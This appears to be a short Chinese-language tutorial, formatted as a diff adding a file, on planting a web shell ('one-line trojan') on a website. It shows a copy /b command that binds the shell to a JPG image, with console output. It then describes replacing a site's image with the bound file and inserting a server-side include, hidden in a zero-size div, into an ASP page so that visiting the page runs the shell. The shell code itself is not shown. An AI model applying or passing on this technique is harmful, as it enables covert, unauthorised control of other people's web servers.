@@ -1,0 +1,30 @@
+准备个一句话木马
+
+和一张网站图片
+
+copy 图片.jpg/b+一句话.txt/b 3.jpg/b
+
+C:\Documents and Settings\l\桌面>copy 1.jpg/b+1.txt/b 3.jpg/b
+1.jpg
+1.txt
+已复制         1 个文件。
+
+绑定后，我们传到它网站里， 把原来的图片给替换掉
+
+然后随便找个asp文件
+
+然后插入
+
+<div style="height=0px; width=0px; overflow=hidden"><!-- #include file=image/图片.jpg --></div>
+这个代码就是调用图片，用css定义了一个大小为0的盒子，超出这个大小的话就隐藏显示
+
+
+比如 创建一个 m.asp
+
+同级目录下 有绑定一句话的图片
+
+m.asp 内容是 <div style="height=0px; width=0px; overflow=hidden"><!-- #include file=image/图片.jpg --></div>
+
+然后访问 m.asp
+
+就等于访问一句话！
